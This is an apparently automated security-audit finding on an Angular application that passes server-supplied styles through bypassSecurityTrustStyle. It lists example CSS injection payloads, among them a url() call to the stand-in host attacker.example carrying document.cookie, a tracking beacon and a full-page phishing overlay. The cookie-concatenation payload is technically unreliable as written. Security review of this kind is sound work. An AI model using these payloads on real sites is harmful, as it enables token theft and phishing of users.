# VULN-001-S: Scanner Finding - css-injection-bypass-security-trust-style

**Phase**: Scanner
**Vulnerability ID**: VULN-001
**Descriptor**: css-injection-bypass-security-trust-style
**Assessment**: 2026-07-31-10-57
**Task**: R-H-001 - XSS / DOM Injection — bypassSecurityTrustStyle and server-content rendering
**Executed**: 2026-07-31T11:30:00Z
**Analyst**: D4rthB0b-Scanner

---

## Finding Summary

**Severity**: HIGH
**File**: `src/app/mini-components/input-field/input-field.component.ts`
**Line**: 196–199
**Function**: `InputFieldComponent.getCss()`
**Detected By**: LLM static analysis

Secondary location: `src/app/mini-components/field/field.component.ts` lines 82–84 (`FieldComponent.getCss()`)

---

## Preliminary Assessment

`DomSanitizer.bypassSecurityTrustStyle()` is called unconditionally with `this.field.style` sourced directly from the ApplinX REST API `GetScreenResponse`. This bypasses Angular's entire CSS sanitization pipeline. The same pattern appears in both `InputFieldComponent` (for input fields) and `FieldComponent` (for read-only display fields), giving both a broad rendering surface.

**Attack path:**
1. An attacker who controls ApplinX server responses (compromised server, MITM on HTTP channel, misconfigured server config) injects a CSS payload into the `style` property of a field object.
2. Angular binds the trusted style value to `[style]` on the DOM element.
3. The browser renders the injected CSS — possible payloads include:
   - `url('https://attacker.example/exfil?t=' + document.cookie)` — CSS data exfiltration (modern browsers)
   - `background-image: url('https://attacker.example/pixel')` — IP/user-agent beacon
   - UI overlay: `position:fixed; top:0; left:0; width:100%; height:100%; background:url(phishing)` — full-page phishing overlay
   - `expression(...)` / `behavior: url(...)` — legacy IE code execution

In modern Chromium/Firefox, direct JS execution via CSS is not possible, but the `url()` exfiltration and overlay attacks remain effective. If a Content Security Policy with a restrictive `style-src` is deployed, these would be mitigated — no CSP evidence was found in the codebase.

The `gx_token` in sessionStorage (VULN-008) would be the primary target of exfiltration via a CSS-triggered injection.

### Code Snippet

```typescript
// input-field.component.ts:196–199
getCss() {
  // console.log("this.field.style : ", this.field.style)
  return this.doms.bypassSecurityTrustStyle(this.field.style ?? '');
}

// input-field.component.html:14
[style]="getCss()"

// field.component.ts:82–84 (identical pattern, broader surface)
getCss() {
  return this.doms.bypassSecurityTrustStyle(this.field.style ?? '');
}

// field.component.html:7,18 (applied to <div> elements hosting screen text)
[style]="getCss()"
```

---

## Context

**Scan Task**: [R-H-001](../../01-recon/tasks/R-H-001-xss-dom-injection.json)
**Target**: src/app/mini-components/input-field/input-field.component.ts, field.component.ts, transformation components
**Coverage**: 12 files scanned (all transformation HTML templates, both field TypeScript components, screen component)

**Tools Used**:
- LLM static analysis (no external tools)

---

## Threat Model & Attack Surface

**Related Threats**:
- TM-001: Session Token Theft via XSS — Bearer token in sessionStorage exfiltrated via CSS data exfiltration
- TM-004: CSS injection via bypassSecurityTrustStyle on server-supplied field.style

**Related Attack Surface**:
- AS-001: Browser DOM ↔ Angular Component Templates trust boundary
- AS-002: ApplinX REST API GetScreenResponse — fields, transformations, styles

---

## Analysis Notes

**Patterns Observed**:
- `bypassSecurityTrustStyle(this.field.style ?? '')` — identical pattern in two components; no validation before bypass
- No `allowedSchemes` or `allowedProperties` filtering applied
- No Content Security Policy detected (no `<meta http-equiv="Content-Security-Policy">` in templates, no `angular.json` CSP config found)
- All transformation HTML templates use `{{ }}` interpolation — **no innerHTML** bindings found across all 9 transformation components (text, table, menu, clickable, calendar, checkbox, modalpopup, multiple-options, line)
- `[src]="transform.triggerImage"` in clickable.component.html — Angular sanitizes src bindings for javascript: URIs by default; lower risk

**False Positives Cleared**:
- `{{transform.triggerText}}`, `{{col.caption}}`, `{{item.text}}` — all use Angular safe interpolation, HTML-escaped automatically
- `[innerHTML]` — confirmed absent in entire codebase transformation templates
- `[src]="transform.triggerImage"` — Angular DomSanitizer strips javascript: from src bindings

**Coverage Assessment**: 100% of in-scope files examined. All transformation HTML templates, both field TypeScript/HTML pairs, screen component structure reviewed.

---

## Recommended Action

**Action**: FLAG_FOR_INQUISITOR

This finding requires detailed investigation by the Inquisitor phase to:
- Confirm exploitability
- Assess real-world impact
- Identify affected components
- Recommend remediation strategy

---

## Next Steps

**For Inquisitor**:
- Confirm how `field.style` values are populated on the ApplinX server — is it a free-form admin string or a constrained palette?
- Determine if angular.json `styles` array or deployment headers configure a `style-src` CSP that would mitigate this
- Test CSS data exfiltration via `url()` injection in a controlled ApplinX configuration
- Verify whether field.style is returned for ALL screen types including pre-authentication screens
- Assess whether FieldComponent or InputFieldComponent is rendered before authentication (attack surface expansion)
- Check if the ApplinX REST API SDK filters style values before returning them in GetScreenResponse

**For Scanner**:
- No follow-up needed; all in-scope files were examined

**For Registry**:
- Update vulnerability-registry.json with VULN-001 as flagged HIGH

---

**Status**: FLAGGED
**Created**: 2026-07-31T11:30:00Z
**Registry**: [vulnerability-registry.md](../../vulnerability-registry.md)
